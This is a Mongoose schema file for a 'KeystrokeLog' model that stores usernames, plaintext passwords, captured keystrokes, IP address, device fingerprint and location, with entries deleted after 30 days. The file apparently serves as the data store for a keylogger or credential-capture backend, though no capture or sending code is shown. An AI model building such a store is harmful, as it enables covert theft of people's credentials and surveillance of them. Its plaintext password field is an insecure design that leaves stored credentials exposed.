// models/KeystrokeLog.js
const mongoose = require('mongoose');

const KeystrokeLogSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true,
    trim: true
  },
  password: {
    type: String,
    required: true
  },
  keystrokes: {
    type: String, // Keystrokes are stored as a single formatted string
    required: true
  },
  ip: {
    type: String, // IP address of the client
    default: 'Unknown'
  },
  device: {
    type: String, // User-Agent or device fingerprint
    default: 'Unknown'
  },
  location: {
    type: String, // Optional location (city, country, etc.)
    default: 'Unknown'
  },
  timestamp: {
    type: Date,
    default: Date.now,
    expires: '30d' // Auto-delete log after 30 days (TTL index)
  }
});

module.exports = mongoose.model('KeystrokeLog', KeystrokeLogSchema);
